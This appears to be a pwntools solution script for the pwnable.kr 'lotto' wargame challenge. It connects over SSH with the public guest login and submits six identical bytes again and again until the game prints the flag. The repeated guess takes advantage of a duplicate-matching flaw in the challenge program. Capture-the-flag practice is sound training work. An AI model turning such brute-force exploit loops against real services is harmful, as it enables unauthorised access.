import os
import time
from pwn import *

START_GAME_OPTION = "1"
FALIED_SINGUTE = "bad luck.."
GUESSING_BTYES = b'!' * 6 

def main():
    ssh_connection = ssh("lotto", "pwnable.kr", password="guest", port=2222)
    lotto_process = ssh_connection.process("./lotto")
    counter = 1

    # Entering game loop
    while True:
        # Handle menu.
        lotto_process.recv()
        lotto_process.sendline(START_GAME_OPTION)
        lotto_process.recv()

        # Guess.
        print(f"Debug: guessing number {counter}")
        lotto_process.sendline(GUESSING_BTYES)
        _, data = lotto_process.recvlines(2)
        if b"bad" not in data:
            print("Got flag!")
            print(data)
            break
        counter += 1

if __name__ == '__main__':
	main()
